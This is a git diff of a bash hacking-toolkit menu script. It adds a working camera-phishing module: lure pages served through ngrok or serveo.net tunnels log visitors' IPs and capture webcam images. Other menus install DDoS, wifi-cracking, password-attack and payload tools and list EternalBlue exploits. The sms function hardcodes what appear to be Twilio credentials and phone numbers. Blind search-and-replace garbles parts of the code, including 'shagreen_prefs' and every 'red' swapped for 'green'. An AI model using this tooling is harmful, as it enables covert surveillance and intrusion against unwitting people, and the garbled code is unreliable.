@@ -1,7 +1,7 @@
 #!/bin/bash
 
 clear
-red='\e[1;31m'
+green='\e[1;31m'
 green='\e[1;32m' 
 blue='\e[1;34m' 
 purple='\e[1;35m'
@@ -9,12 +9,304 @@ cyan='\e[1;36m'
 white='\e[1;37m'
 yellow='\e[1;33m'
 
+dependencies() {
+
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+ 
+
+
+}
+
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+
+}
+
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+
+cat ip.txt >> saved.ip.txt
+
+
+}
+
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+
+fi
+
+sleep 0.5
+
+if [[ -e "Log.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+rm -rf Log.log
+fi
+sleep 0.5
+
+done 
+
+}
+
+
+server() {
+
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+
+sleep 8
+fi
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 3
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+
+}
+
+
+payload_ngrok() {
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
+sed 's+forwarding_link+'$link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+fi
+rm -rf index3.html
+
+}
+
+select_template() {
+if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
+printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+sleep 1
+clear
+head
+camphish
+else
+printf "\n-----Choose a template----\n"    
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+default_option_template="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+option_tem="${option_tem:-${default_option_template}}"
+if [[ $option_tem -eq 1 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+fest_name="${fest_name//[[:space:]]/}"
+elif [[ $option_tem -eq 2 ]]; then
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+elif [[ $option_tem -eq 3 ]]; then
+printf ""
+else
+printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
+sleep 1
+select_template
+fi
+fi
+}
+
+ngrok_server() {
+
+
+if [[ -e ngrok ]]; then
+echo ""
+else
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+exit 1
+fi
+
+else
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf "\e[1;93m[!] Download error... \e[0m\n"
+exit 1
+fi
+fi
+fi
+if [[ -e ~/.ngrok2/ngrok.yml ]]; then
+printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
+cat  ~/.ngrok2/ngrok.yml
+read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
+fi
+else
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+fi
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+./ngrok http 3333 > /dev/null 2>&1 &
+sleep 10
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
+if [[ -z "$link" ]]; then
+printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
+exit 1
+else
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+fi
+payload_ngrok
+checkfound
+}
+
+camphish() {
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+
+printf "\n-----Choose tunnel server----\n"    
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+#printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Back\e[0m\n"
+default_option_server="1"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+option_server="${option_server:-${default_option_server}}"
+select_template
+if [[ $option_server -eq 2 ]]; then
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+start
+
+elif [[ $option_server -eq 1 ]]; then
+ngrok_server
+
+#clear
+#bash Tools-Hk.sh
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+sleep 1
+clear
+camphish
+
+fi
+
+
+}
+
+
+payload() {
+
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+fi
+rm -rf index3.html
+
+}
+
+start() {
+
+default_choose_sub="Y"
+default_subdomain="saycheese$RANDOM"
+
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
+fi
+
+server
+payload
+checkfound
+
+}
+
+
+
+
+#############################################
 # detect ctrl+c exiting
 trap ctrl_c INT
 ctrl_c() {
 clear
-echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
-echo -e $red"[*] Stopping Services... "
+echo -e $green"[*] (Ctrl + C ) Detected, Trying To Exit... "
+echo -e $green"[*] Stopping Services... "
 apache_svc_stop
 postgresql_stop
 sleep 1
@@ -22,9 +314,10 @@ echo ""
 echo -e $yellow"[*] Thanks For Using Tools-Hk  :)"
 exit
 }
+
 ppppp () {
 
-echo -e $green     '{ -10- } ===> '$red " Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec) "
+echo -e $green     '{ -10- } ===> '$green " Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec) "
 echo -e $green     '{ -11- } ===> '$white " Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)"
 }
 #function lhost
@@ -53,25 +346,25 @@ function payload_name()
  apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "example: evilapk" --entry --entry-text "evilapk" --width 300 2> /dev/null)
 }
 sms () {
-rm -rif $HOME/Tools-Hk/sms.py
-touch $HOME/Tools-Hk/sms.py
-echo 'from twilio.rest import Client' >> $HOME/Tools-Hk/sms.py
+rm -rif sms.py
+touch sms.py
+echo 'from twilio.rest import Client' >> sms.py
 #echo 'account_sid = 'ACe5063b7f526514972e285c82fda368cd'' >> $HOME/Building-Distro/sms.py
-echo "account_sid = 'ACe5063b7f526514972e285c82fda368cd'" >> $HOME/Tools-Hk/sms.py
-echo "auth_token = '7a4462ded5843d79bf8f8778e00e2a44'" >> $HOME/Tools-Hk/sms.py
-echo "client = Client(account_sid, auth_token)" >> $HOME/Tools-Hk/sms.py
+echo "account_sid = 'ACacd13e6e908f06746c24faf1b151d48c'" >> sms.py
+echo "auth_token = '5253dbb724b31a8af71a669948c26fa8'" >> sms.py
+echo "client = Client(account_sid, auth_token)" >> sms.py
 #echo 'auth_token = '7a4462ded5843d79bf8f8778e00e2a44'' >> $HOME/Building-Distro/sms.py
-echo 'message = client.messages \' >> $HOME/Tools-Hk/sms.py
-echo '.create(' >> $HOME/Tools-Hk/sms.py
+echo 'message = client.messages \' >> sms.py
+echo '.create(' >> sms.py
 read -p "insert Your msg to Devloper ex : 'Hello Dev.Mohammed', " msg
-echo "body="$msg >> $HOME/Tools-Hk/sms.py
-echo "messaging_service_sid='MGf4e12105f858b9d74dac6cd288789c31'," >> $HOME/Tools-Hk/sms.py
-echo "from_='+12054305330'," >> $HOME/Tools-Hk/sms.py
-echo "status_callback='http://postb.in/1234abcd'," >> $HOME/Tools-Hk/sms.py
-echo "to='+967733014747'," >> $HOME/Tools-Hk/sms.py
-echo ')' >> $HOME/Tools-Hk/sms.py
-echo 'print(message.sid)' >> $HOME/Tools-Hk/sms.py
-python $HOME/Tools-Hk/sms.py
+echo "body="$msg >> sms.py
+echo "messaging_service_sid='MG0099696877275797e58b24a27ba9b1f1'," >> sms.py
+echo "from_='+15017122661'," >> sms.py
+echo "status_callback='http://postb.in/1234abcd'," >> sms.py
+echo "to='+967733014747'," >> sms.py
+echo ')' >> sms.py
+echo 'print(message.sid)' >> sms.py
+python sms.py
 
 }
 meta () {
@@ -94,16 +387,16 @@ echo ''
 echo ''
 toilet -f term -F border --gay "fb : www.fb.com/mohammedinf0 "
 sleep 0.3
-echo -e $red
+echo -e $green
 #figlet -f smmono9 "Tools-Hk" 
-bash T
+bash banner2
 sleep 0.5
-echo -e $red
+echo -e $green
 echo -e $green"-------------------------------------------"
 sleep 0
 echo -e $green"--------------$yellow(3 in 1) ---------------"
 sleep 0
-echo -e $yellow "By =====> $red HACKER / MOHAMMED Info <====="
+echo -e $yellow "By =====> $green HACKER / MOHAMMED Info <====="
 sleep 0
 echo ''
 }
@@ -111,14 +404,14 @@ echo ''
 
 head () {
 echo -e $green
-#oilet -fecho -e $red
+#oilet -fecho -e $green
 #iglet -f smmono9 "Tools-Hk"nn
 #sleep 0.3
 #echo -e $white '############## term -F border --gay "fb : www.fb.com/profionaldhim "
 toilet -f term -F border --gay "fb : www.fb.com/mohammedinf0 "
 echo -e $green
 sleep 0.3
-bash T
+bash banner
 #cat head2
 echo -e $yellow
 
@@ -129,19 +422,19 @@ head
 echo -e $green   '{ -1- } ===> ' $white " Tools-Gnuroot & kali linux"
 echo ""
 sleep 0
-echo -e $green   '{ -2- } ===> ' $red " Tools-Termux"
+echo -e $green   '{ -2- } ===> ' $green " Tools-Termux"
 echo ""
 sleep 0
 echo -e $green   '{ -3- } ===> ' $white " Use automatic Tools "
 echo ""
 sleep 0
-echo -e $green   '{ -4- } ===> ' $red " Repair Termux & Kali Linux"
+echo -e $green   '{ -4- } ===> ' $green " Repair Termux & Kali Linux"
 echo ""
 sleep 0
 echo -e $green   '{ -5- } ===> ' $white " Encrypt Your Tools"
 echo ""
 sleep 0
-echo -e $green   '{ -6- } ===> ' $red " Update "
+#echo -e $green   '{ -6- } ===> ' $green " Update "
 echo ""
 sleep 0
 echo -e $green   "0- EXIT |-|"
@@ -149,7 +442,7 @@ echo ""
 echo "" 
 sleep 0
 echo -e $green "Enter The Number:" 
-echo -e $red
+echo -e $green
 sleep 0
 ###################################
 read -p " insert : " name
@@ -161,39 +454,39 @@ if [ $name = 1 ]
 then 
 clear
 head
-echo -e $red "Gnuroot"
+echo -e $green "Gnuroot"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " DDOS Attack"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Sniffing" 
+echo -e $green '{ -2- } ===> ' $green " Sniffing" 
 echo "" 
 echo -e $green '{ -3- } ===> ' $white " Wifi Hack"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " webSite Hack"
+echo -e $green '{ -4- } ===> ' $green " webSite Hack"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " Accounts Hack"
 echo ""
-echo -e $green '{ -6- } ===> ' $red " creat Backup"
+echo -e $green '{ -6- } ===> ' $green " creat Backup"
 echo ""
 echo -e $green '{ -7- } ===> ' $white " injection payload"
 echo ""
-echo -e $green '{ -8- } ===> ' $red " other"
+echo -e $green '{ -8- } ===> ' $green " other"
 echo ""
 echo -e $green "00- back" 
 echo "" 
 echo "" 
 echo -e $green "Enter The Number:"
-echo -e $red
+echo -e $green
 read -p " insert : " Gnuroot
 if [ $Gnuroot = 1 ]
 then
 clear
 head
-echo -e $red "DDOS Attack"
+echo -e $green "DDOS Attack"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Slowloris"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Hammer"
+echo -e $green '{ -2- } ===> ' $green " Hammer"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " Metasploit"
 echo ""
@@ -202,7 +495,7 @@ read -p " insert : " Ddos
 if [ $Ddos = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Slowloris"
 cd ~
 git clone https://github.com/gkbrk/slowloris.git
@@ -211,7 +504,7 @@ fi
 if [ $Ddos = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Hammer"
 cd ~
 git clone https://github.com/cyweb/hammer.git
@@ -220,7 +513,7 @@ fi
 if [ $Ddos = 4 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Metasploit-FrameWork"
 cd ~
 apt-get install curl
@@ -243,11 +536,11 @@ if [ $Gnuroot = 2 ]
 then
 clear
 head
-echo -e $red "Sniffing"
+echo -e $green "Sniffing"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Websploit"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Routersploit"
+echo -e $green '{ -2- } ===> ' $green " Routersploit"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " Metasploit"
 echo ""
@@ -256,7 +549,7 @@ read -p " insert : " sniffing
 if [ $sniffing = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Websploit"
 cd ~
 apt install python2 
@@ -267,7 +560,7 @@ fi
 if [ $sniffing = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Routersploit"
 cd ~
 git clone https://github.com/reverse-shell/routersploit
@@ -276,7 +569,7 @@ fi
 if [ $sniffing = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Metasploit-FrameWork"
 cd ~
 apt-get install curl
@@ -299,21 +592,21 @@ if [ $Gnuroot = 3 ]
 then
 clear
 head
-echo -e $red "Wifi Hack"
+echo -e $green "Wifi Hack"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Wifite"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " aircrack-ng"
+echo -e $green '{ -2- } ===> ' $green " aircrack-ng"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " HT-WPS-Breaker"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " fluxion"
+echo -e $green '{ -4- } ===> ' $green " fluxion"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " Routersploit"
 echo ""
-echo -e $green '{ -6- } ===> ' $red " airgeddon"
+echo -e $green '{ -6- } ===> ' $green " airgeddon"
 echo ""
-echo -e $green '{ -7- } ===> ' $red " crunch(list password)"
+echo -e $green '{ -7- } ===> ' $green " crunch(list password)"
 echo ""
 echo -e $green "00- Back"
 echo ""
@@ -321,7 +614,7 @@ read -p " insert : " wifi
 if [ $wifi = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "wifite"
 cd ~
 apt-get install wifite
@@ -330,7 +623,7 @@ fi
 if [ $wifi = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "aircrack-ng"
 cd ~
 apt-get install aircrack-ng
@@ -339,7 +632,7 @@ fi
 if [ $wifi = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "HT-WPS-Breaker"
 cd ~
 git clone https://github.com/SilentGhostX/HT-WPS-Breaker
@@ -348,7 +641,7 @@ fi
 if [ $wifi = 4 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "fluxion"
 cd ~ 
 git clone https://github.com/facebook/flux.git
@@ -357,7 +650,7 @@ fi
 if [ $wifi = 5 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Routersploit"
 cd ~
 git clone https://github.com/reverse-shell/routersploit
@@ -366,7 +659,7 @@ fi
 if [ $wifi = 6 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "airgeddon"
 cd ~
 git clone https://github.com/v1s1t0r1sh3r3/airgeddon
@@ -375,7 +668,7 @@ fi
 if [ $wifi = 7 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet " To creat wordlist"
 cd ~
 apt-get install crunch -y
@@ -391,31 +684,31 @@ if [ $Gnuroot = 4 ]
 then
 clear
 head
-echo -e $red "WebSite Hack"
+echo -e $green "WebSite Hack"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Sqlmap"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " webscan"
+echo -e $green '{ -2- } ===> ' $green " webscan"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " tor"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " scriptux"
+echo -e $green '{ -4- } ===> ' $green " scriptux"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " Sitebroker"
 echo ""
-echo -e $green '{ -6- } ===> ' $red " nmap"
+echo -e $green '{ -6- } ===> ' $green " nmap"
 echo ""
 echo -e $green '{ -7- } ===> ' $white " Devploit"
 echo ""
-echo -e $green '{ -8- } ===> ' $red " Iplocator"
+echo -e $green '{ -8- } ===> ' $green " Iplocator"
 echo ""
 echo -e $green '{ -9- } ===> ' $white " sniper-h"
 echo ""
-echo -e $green '{ -10- } ===> ' $red " hash-identifier"
+echo -e $green '{ -10- } ===> ' $green " hash-identifier"
 echo ""
 echo -e $green '{ -11- } ===> ' $white " dirsearch"
 echo ""
-echo -e $green '{ -12- } ===> ' $red " Google-Dork-Scan"
+echo -e $green '{ -12- } ===> ' $green " Google-Dork-Scan"
 echo ""
 echo -e $green '{ -13- } ===> ' $white " zenmap"
 echo ""
@@ -424,7 +717,7 @@ read -p " insert : " website
 if [ $website = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Sqlmap"
 cd ~
 git clone https://github.com/sqlmapproject/sqlmap
@@ -433,7 +726,7 @@ fi
 if [ $website = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "webscan"
 cd ~
 git clone https://github.com/kost/docker-webscan
@@ -442,7 +735,7 @@ fi
 if [ $website = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "tor"
 cd ~
 apt-get install tor -y
@@ -450,7 +743,7 @@ fi
 if [ $website = 4 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "scriptux"
 cd ~
 git clone https://github.com/Gameye98/Scriptux
@@ -459,7 +752,7 @@ fi
 if [ $website = 5 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "sitebroker"
 cd ~
 git clone https://github.com/Anon-Exploiter/SiteBroker
@@ -468,14 +761,14 @@ fi
 if [ $website = 6 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "nmap"
 apt install nmap
 fi
 if [ $website = 7 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Devploit"
 git clone https://github.com/joker25000/Devploit
 bash Tools-Hk.sh
@@ -483,7 +776,7 @@ fi
 if [ $website = 8 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "IPlocator"
 cd ~
 git clone https://github.com/AndreasBriese/ipLocator
@@ -492,7 +785,7 @@ fi
 if [ $website = 9 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "sniper-h"
 git clone https://github.com/laser010/sniper-h
 bash Tools-Hk.sh
@@ -500,7 +793,7 @@ fi
 if [ $website = 10 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "hash-identifier"
 git clone https://github.com/Miserlou/Hash-Identifier
 bash Tools-Hk.sh
@@ -508,7 +801,7 @@ fi
 if [ $website = 11 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "dirsearch"
 cd ~
 git clone https://github.com/maurosoria/dirsearch
@@ -516,7 +809,7 @@ fi
 if [ $website = 12 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Google-Dork-Scan"
 cd ~
 git clone https://github.com/ReiGelado/Google-Dork-Scan
@@ -525,7 +818,7 @@ fi
 if [ $website = 13 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "zenmap"
 cd ~
 apt-get install zenmap
@@ -541,11 +834,11 @@ if [ $Gnuroot = 5 ]
 then
 clear
 head
-echo -e $red "Account Hack"
+echo -e $green "Account Hack"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " hydra"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " crunch(list password)"
+echo -e $green '{ -2- } ===> ' $green " crunch(list password)"
 echo ""
 echo -e $green "00- Back"
 echo ""
@@ -553,7 +846,7 @@ read -p " insert : " account_Hack
 if [ $account_Hack = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "hydra"
 cd ~
 apt-get install hydra
@@ -562,7 +855,7 @@ fi
 if [ $account_Hack = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "crunch"
 cd ~
 apt-get install crunch
@@ -578,11 +871,11 @@ if [ $Gnuroot = 6 ]
 then
 clear
 head
-echo -e $red "Backup / Recovery"
+echo -e $green "Backup / Recovery"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Backup"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Recovery"
+echo -e $green '{ -2- } ===> ' $green " Recovery"
 echo ""
 echo -e $green "00- Back"
 echo ""
@@ -590,17 +883,17 @@ read -p " insert : " backup_recovery
 if [ $backup_recovery = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "backup"
 cd ~
 apt update && apt upgrade
 cd /data/data/com.gnuroot.debian/
-tar -cvzf /sdcard/buckup-gnuroot.tgz app_HOME cache databases debian files lib support shared_prefs
+tar -cvzf /sdcard/buckup-gnuroot.tgz app_HOME cache databases debian files lib support shagreen_prefs
 fi
 if [ $backup_recovery = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Recovery"
 cd ~
 apt update && apt upgrade
@@ -623,11 +916,11 @@ if [ $Gnuroot = 7 ]
 then
 clear
 head
-echo -e $red   "PAYLOAD"
+echo -e $green   "PAYLOAD"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " Venom"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " PAYMAX"
+echo -e $green '{ -2- } ===> ' $green " PAYMAX"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " txtool"
 echo ""
@@ -637,7 +930,7 @@ read -p " insert : " payload2
 if [ $payload2 = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "venom"
 cd ~
 git clone https://github.com/r00t-3xp10it/venom 
@@ -646,7 +939,7 @@ fi
 if [ $payload2 = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "PAYMAX"
 cd ~
 git clone https://github.com/Matrix07ksa/PAYMAX
@@ -655,7 +948,7 @@ fi
 if [ $payload2 = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Txtool"
 cd ~
 git clone https://github.com/kuburan/txtool
@@ -671,19 +964,19 @@ if [ $Gnuroot = 8 ]
 then
 clear
 head
-echo -e $red   "Other"
+echo -e $green   "Other"
 echo ""
 echo -e $green '{ -1- } ===> ' $white " spammer-Grab"
 echo ""
-echo -e $green '{ -2- } ===> ' $red " Ngrok"
+echo -e $green '{ -2- } ===> ' $green " Ngrok"
 echo ""
 echo -e $green '{ -3- } ===> ' $white " change style"
 echo ""
-echo -e $green '{ -4- } ===> ' $red " style lxde"
+echo -e $green '{ -4- } ===> ' $green " style lxde"
 echo ""
 echo -e $green '{ -5- } ===> ' $white " wireshark"
 echo ""
-echo -e $green '{ -6- } ===> ' $red " nano"
+echo -e $green '{ -6- } ===> ' $green " nano"
 echo ""
 echo -e $green "00- Back "
 echo ""
@@ -691,7 +984,7 @@ read -p " insert : " other
 if [ $other = 1 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "spammer-Grab"
 cd ~
 cd $Home
@@ -709,7 +1002,7 @@ fi
 if [ $other = 2 ]
 then
 clear
-echo -e $red
+echo -e $green
 figlet "Ngrok"
 cd $Home
 mv Tools-Hk/ngrok-stable-linux-arm.zip $HOME
@@ -724,7 +1017,7 @@ fi
 if [ $other = 3 ]
 then
 clear
-echo -e $red
+echo -e $green
